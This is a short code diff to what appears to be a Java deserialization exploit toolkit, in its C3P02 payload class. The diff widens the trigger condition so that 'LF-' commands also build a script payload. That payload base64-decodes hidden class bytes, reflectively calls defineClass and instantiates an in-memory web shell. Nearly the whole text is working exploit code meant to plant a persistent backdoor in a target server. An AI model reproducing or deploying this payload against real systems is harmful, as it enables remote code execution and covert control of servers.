@@ -32,7 +32,7 @@ public class C3P02 implements ObjectPayload<Object> {
 
 	public Object getObject(String command) throws Exception {
 
-		if (command.startsWith("EX-")) {
+		if (command.startsWith("EX-") || command.startsWith("LF-")) {
 			Gadgets.createTemplatesImpl(command);
 			command = "var data ='" + base64Encode(memShellClassBytes) + "';var dataBytes=java.util.Base64.getDecoder().decode(data);var cloader= java.lang.Thread.currentThread().getContextClassLoader();var superLoader=cloader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();var method=superLoader.getDeclaredMethod('defineClass',dataBytes.getClass(),java.lang.Integer.TYPE,java.lang.Integer.TYPE);method.setAccessible(true);var memClass=method.invoke(cloader,dataBytes,0,dataBytes.length);memClass.newInstance();";
 		} else {
